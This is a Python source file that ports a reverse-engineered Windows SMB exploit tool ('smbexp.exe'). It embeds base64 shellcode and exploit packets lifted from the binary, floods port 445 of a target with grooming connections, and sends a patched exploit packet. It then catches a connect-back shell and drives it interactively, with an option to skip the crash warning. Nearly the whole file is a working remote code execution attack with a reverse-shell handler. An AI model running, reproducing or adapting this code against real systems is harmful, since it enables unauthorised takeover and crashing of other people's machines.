# -*- coding: utf-8 -*-
"""
smbexp.py -- Python port of `smbexp.exe` (12008smbexp directory).

Recovered via IDA Pro (see re_project history) from `smbexp.exe`:

    main (0x401890):
        smbexp.exe <TagIp> <BackPort>          (3 args: local IP auto via
                                                 getsockname on the first 445
                                                 connection)
        smbexp.exe <TagIp> <LocalIp> <BackPort> (4 args: explicit local IP)
        -> resolves <TagIp>, WSAStartup, TCP connect to 445 (0x1BD),
           send 106-byte SMB negotiate (buf_0), read response and compute
           qword[108]-qword[116] "uptime hint": if < 10 (100ns/1e7/0x34 units)
           it prints "Maybe Blue Screen. Wait For %d Minutes" and asks
           1:continue / 2:quit -- a defensive check before smashing the target.
        -> then three phases on *fresh* 445 connections, all sending the same
           564-byte SMB packet (buf_) with byte[176] set to the phase number:
               phase 0: 70 connections  (byte[176] = 0)
               phase 1: 86 connections  (byte[176] = 1)
               phase 2: 195 connections (byte[176] = 2)
        -> sub_401400(ThreadId, port) patches the bind-shell stub inside buf
           (qword_403087, offset 0x077 of buf) with the local IP (XOR 0xFE)
           and starts a listener thread (StartAddress) on <BackPort>.
        -> patches buf_1 (the exploit packet) at offset 0x3EC..0x3EF and 0x3F0
           (dword_403838 / byte_40383C) with the sockaddr bytes
           [0x68,0x02,0,port>>8] and [port&0xFF], connects again to 445 and
           sends the 1197-byte SMB exploit (buf_1), sleeps 10 s, closes.

    StartAddress (0x4014B0) listener thread:
        bind(0, <BackPort>), listen(30), select 30 s for the victim's
        connect-back; accept; if no data within 4 s -> "L* ExpOk." -> create
        sub_401640 (accepts the interactive shell, prints remote output) and
        sub_401770 (feeds stdin lines to the socket, "exit\r\n" quits), send
        the 322-byte buf stage, sleep 10 s.  If the victim sends data on the
        first accept, close and accept again (30 s window); timeout ->
        "E* ExpFailed..".

All payload byte arrays below are lifted verbatim from the .data section of
smbexp.exe (file offsets RVA==RawPtr for this image, VA base 0x400000):
    buf  0x403010 (322 B)   -- stage sent to the connect-back shell
    buf_0 0x4031A4 (106 B)  -- SMB negotiate
    buf_  0x403210 (564 B)  -- grooming packet; byte[176] = phase 0/1/2
    buf_1 0x40344C (1197 B) -- final exploit packet (patched with IP/port)
"""
import base64
import socket
import struct
import sys
import time

BUF  = base64.b64decode("AQIDBOsQW0szyWa5PgGANAv+4vrrBejr////F////v6hml/O/v7+db7ydY7iU3WW9nUJlPqnFl/+/v4cB75+xj2LBK6Wzcz+/paJjcyhdSIV+q2uAdgWCQEBAat1FqSklP2nFor+/v4cB6+vr6+U/5T8AajudSaWUuv+iJb8/v7ndTKU7q+tAajqez6LuJadk5r+d5jefRKqdQKU6qd3+nEcBTi57roAucIAucN3obZ3obJ3oa5zue6prq+vr5T/r68BiN6vAaj6lAEByQGo8q0BqOaWAQEB8QGo9q+odYvCdYrQhv0LqHWI3v0LzTe3v1P9O80l8UDuxCiK9j818/0kvhUPxeGLGaB1oNr9I5h18rV1oOL9I3X6df07VaCnPRYEAAEBcLDwEowATehOt9MlUyf7MCf3C1MSB1SeGYc4hw==")
BUF0 = base64.b64decode("AAAAZv5TTUJAAAAAAAAAAAAAfgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAEAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAg==")
BUF_ = base64.b64decode("AAACMP9TTUJyAAAAABgDyLsBAAAA6x8AAAAAAAAAAAAAAAAAAA0CAlNNQiAyLjAwMgACQUFBQUFBQUFBQUFBQQAI3/9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQAI3/9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEACd//QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQABAABBQUFBQUFBQUFBQUFBQUFBBEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBAAAAAAAAAABBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB+/////////9BQUFBQUFBQUFBQUFBQUFBQUFBQUJCQkJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEA")
BUF1 = base64.b64decode("AAAEqf9TTUJyAAAAABgDyLsBAAAA6xwAAAAAAAAAAAAAAAAAAIYEAlNNQiAyLjAwMgAC6TgBAAAAAAAAAAAAAAAI3/9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQAI3/9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEAAAAAQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQAAAABBQUFBQUFBQUFBQUFBQUFBAEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBAAAAAAAAAABBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB+/////////9BQUFBQUFBQUFBQUFBQUFBQUFBQbwJ3//o/////8NejXYYM8mNiR4DAAC/BAjf/1db86T/42o4W2SLA4tABGYlAfBIZoE4TVp19IvouxQA6oDomgIAAI1XBFJqBP/Qi0cEM8mxoAPBM8lmuawAiwCBPAFMU0FTdAmBPAFsc2FzdeyNgGD///9QULtq4GgA6F0CAAD/0LgBAAAA9sABdAtYUIpYa4DLMohYa7tqUGgA6DwCAAD/0FiLiGgBAACLCYuZaP7///bDQHTzi5kg/v//9sMgdOiNibj9//+JTxS7LAg1AOgIAgAAaAAQAABqAP/QiUcQuwDJ7QDo8gEAAI1PiIkBjXEEu152aQDo4AEAADPSUmoBuwQI/n+Nmz4BAABTUlZSi08UUYtfEFP/0Ls+Z9MA6LgBAAAz0lJSUotfEFP/0LuUdh006KMBAAAz0olXCMdHDAAAAICNXwhTagBqAP/QuwDJ7QDogwEAAFBb/9Pr/JCQkJDo/////8NejUZ3M8lRUVFQUVFqMFlkiwGLQAyLcByLbgitsQD2wQF0A4vwrYtACFCxAfbBAXQZahhZZIsBjZioAQAAU7sKISEf6CsBAAD/0F27FPMMAOgeAQAA/9BQM8lJUVC7vNDsBugMAQAA/9C7Gn4GAOgAAQAA/9DD6P/////DXmowWWSLAYtADItwHK2xAPbBAXQDi/Cti2gIu0IxDgDo0gAAAGpAaAAQAABoACAAAGoA/9CWu4ZXDQDotwAAAGhsbAAAaDMyLmRoV1MyX40cJFP/0FtbW1WL6LsUkwMA6JIAAACB7AACAACNHCRTagL/0IHEAAIAALukNgAA6HQAAABqAGoBagL/0Je7fGcAAOhhAAAAaKwVAHZoAgAAGYvcahBTV//QW1uFwHwju8AMAADoPwAAAFBqAGoEVlf/0FhqAGj/HwAAVlf/0Ff/1l1dM8lRu5RdAwDoGAAAAP/Qw5CQkJBg6P/////DXotG9v/QYcIUAGAPt3U8i3Q1eI18NQBXi38gjXw9ADPJUYs0j410NQAzwDPJmayEwHQMgMhgA8jB4QED0Ovvi9FZQTnaddpJM9Jfi3ckjXQ1AGaLFE7B4gKLRxyNRAUAiwQCjUQFAIlEJBxhw8wA")

BUF_OFF_PHASE = 176          # byte offset in buf_ patched to phase 0/1/2
BUF1_OFF_PATCH = 0x3EC       # dword_403838: [0x68,0x02,0,port>>8]
BUF1_OFF_PORTLO = 0x3F0      # byte_40383C:  port & 0xFF
BUF_OFF_KEY = 0x077          # qword_403087: local IP, XOR'ed with 0xFE

PORT_PATCH_CONST = 0x68      # sa_data[2] constant (also a push-imm in stub)


def _resolve(host):
    """sub_401000: returns 4-byte network-order packed IP or None."""
    try:
        return socket.inet_aton(socket.gethostbyname(host))
    except OSError:
        return None


def _tcp_connect(ip4, port):
    """sub_401320: TCP connect with keepalive + (optionally) SO_KEEPALIVE."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(8)
    try:
        s.connect((socket.inet_ntoa(ip4), port))
    except OSError:
        s.close()
        return None
    return s


def _send_all(s, buf):
    """sub_4012D0: sendall (WSAETIMEDOUT tolerated)."""
    return s.sendall(buf)


def _recv_len(s, n):
    """sub_401270: recv exactly n bytes (0 on EOF, partial on timeout)."""
    chunks = []
    got = 0
    while got < n:
        try:
            b = s.recv(n - got)
        except socket.timeout:
            return b"".join(chunks)
        if not b:
            if got == 0:
                return None
            return b"".join(chunks)
        chunks.append(b)
        got += len(b)
    return b"".join(chunks)


def _patch_key(buf, local_ip):
    """sub_401400 patch: XOR bytes 0..7 with 0xFE, B0=0x96, B5=0x96."""
    b = bytearray(buf)
    key = bytearray(12)
    key[0] = 0
    key[1:5] = local_ip           # network-order bytes
    key[6:8] = struct.pack("<H", 0x0002)   # word_403154
    key[8:10] = struct.pack("<H", 0)       # port placeholder (not stored)
    for i in range(10):
        key[i] ^= 0xFE
    key[0] = 0x96
    key[5] = 0x96
    b[BUF_OFF_KEY:BUF_OFF_KEY+8] = bytes(key[0:8])
    return bytes(b)


def _patch_buf1(buf1, port):
    """main final patch: dword_403838 / byte_40383C inside buf_1."""
    b = bytearray(buf1)
    # dword_403838 = sa_data[2..5] = [0x68, 0x02, 0x00, port>>8]
    b[BUF1_OFF_PATCH + 0] = PORT_PATCH_CONST
    b[BUF1_OFF_PATCH + 1] = 0x02
    b[BUF1_OFF_PATCH + 2] = 0x00
    b[BUF1_OFF_PATCH + 3] = (port >> 8) & 0xFF
    # byte_40383C = HIBYTE(netshort[0]) = port & 0xFF (low byte, network order)
    b[BUF1_OFF_PORTLO] = port & 0xFF
    return bytes(b)


def _phase(ip4, buf_phase, count, label):
    print(label)
    for _ in range(count):
        s = _tcp_connect(ip4, 445)
        if s is None:
            print("E* Tcp Connect Error.")
            return False
        try:
            _send_all(s, buf_phase)
        finally:
            s.close()
    return True


def run(target, backport, local_ip=None, yes=False):
    """
    Drive the original exploit sequence against <target>:<445>.
    Returns 0 on success, 1 on failure, 2 when the user aborts.
    """
    print("[*] smbexp (12008smbexp) — Python port")
    tip = _resolve(target)
    if tip is None:
        print("E* cannot resolve target: %s" % target)
        return 1

    if not (1 <= backport <= 65535):
        print("E* invalid BackPort: %d" % backport)
        return 1

    # ---- first connection: SMB negotiate + response "uptime" hint ---------
    s = _tcp_connect(tip, 445)
    if s is None:
        print("E* Tcp Connect Error.")
        return 1
    if local_ip is None:
        local_ip = socket.inet_aton(s.getsockname()[0])
    try:
        _send_all(s, BUF0)
        s.settimeout(0.3)
        resp = b""
        try:
            while True:
                b = s.recv(8192)
                if not b:
                    break
                resp += b
        except socket.timeout:
            pass
    finally:
        s.close()

    if resp:
        a = struct.unpack_from("<Q", resp, 108)[0] if len(resp) >= 124 else 0
        b = struct.unpack_from("<Q", resp, 116)[0] if len(resp) >= 124 else 0
        minutes = ((a - b) if a > b else 0) // 10000000 // 0x34
        if minutes < 10 and not yes:
            print("Maybe Blue Screen. Wait For %d Minutes" % (10 - minutes))
            print("\t1: continue")
            print("\t2: quit")
            if sys.version_info[0] >= 3:
                ans = input().strip()
            else:
                ans = raw_input().strip()
            if ans != "1":
                print("[*] aborted by user.")
                return 2

    # ---- three grooming phases --------------------------------------------
    print("L* Start ...... ")
    buf_phase = bytearray(BUF_)
    buf_phase[BUF_OFF_PHASE] = 0
    if not _phase(tip, bytes(buf_phase), 70, ""):
        return 1
    buf_phase[BUF_OFF_PHASE] = 1
    if not _phase(tip, bytes(buf_phase), 86, "\nL* Send packets 1\n"):
        return 1
    buf_phase[BUF_OFF_PHASE] = 2
    if not _phase(tip, bytes(buf_phase), 195, "L* Send packets 2\n"):
        return 1
    print("L* Send packets 3\n")

    # ---- patch stage + start back-port listener ----------------------------
    big = _patch_key(BUF, local_ip)

    # ---- final exploit packet + delivery -----------------------------------
    exp = _patch_buf1(BUF1, backport)
    s = _tcp_connect(tip, 445)
    if s is None:
        print("E* Tcp Connect Error.")
        return 1
    try:
        _send_all(s, exp)
    finally:
        s.close()
    print("L* Send ExpPacket \n")

    # ---- interact with the connect-back shell ------------------------------
    print("L* Listen On %d ...." % backport)
    lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lst.bind(("0.0.0.0", backport))
    lst.listen(30)
    lst.settimeout(30)
    try:
        conn = lst.accept()[0]
    except socket.timeout:
        print("E* ExpFailed..")
        lst.close()
        return 1
    conn.settimeout(4)
    try:
        data = conn.recv(1)
        has_data = len(data) > 0
    except socket.timeout:
        has_data = False
    if has_data:
        conn.close()
        print("E* ExpFailed.. (first connect sent data)")
        lst.close()
        return 1
    print("L* ExpOk.")
    try:
        _send_all(conn, big)
        conn.settimeout(10)
        print(".\n[+] interactive shell ready on 0.0.0.0:%d" % backport)
        _interact(conn)
    finally:
        conn.close()
        lst.close()
    return 0


def _interact(conn):
    """sub_401640 + sub_401770 combined: print remote output, forward stdin."""
    import select
    import threading
    stop = threading.Event()

    def pump_in():
        while not stop.is_set():
            try:
                line = sys.stdin.readline()
            except Exception:
                break
            if not line:
                break
            if line.lower().strip() == "exit":
                stop.set()
                try:
                    conn.sendall(b"exit\r\n")
                except OSError:
                    pass
                break
            try:
                conn.sendall(line.encode("utf-8", "replace"))
            except OSError:
                break

    t = threading.Thread(target=pump_in, daemon=True)
    t.start()
    try:
        while not stop.is_set():
            r, _, _ = select.select([conn], [], [], 1.0)
            if not r:
                continue
            try:
                b = conn.recv(2048)
            except OSError:
                break
            if not b:
                break
            sys.stdout.write(b.decode("utf-8", "replace"))
            sys.stdout.flush()
    finally:
        stop.set()


def main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(
        prog="smbexp", description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="<TagIp> target host IP address")
    ap.add_argument("backport", type=int, help="<BackPort> shell connect-back port")
    ap.add_argument("-l", "--local-ip", default=None,
                    help="explicit local IP to bake into the shellcode (default: auto)")
    ap.add_argument("-y", "--yes", action="store_true",
                    help="skip the 'Maybe Blue Screen' prompt")
    args = ap.parse_args(argv)
    return run(args.target, args.backport, args.local_ip, args.yes)


if __name__ == "__main__":
    sys.exit(main())
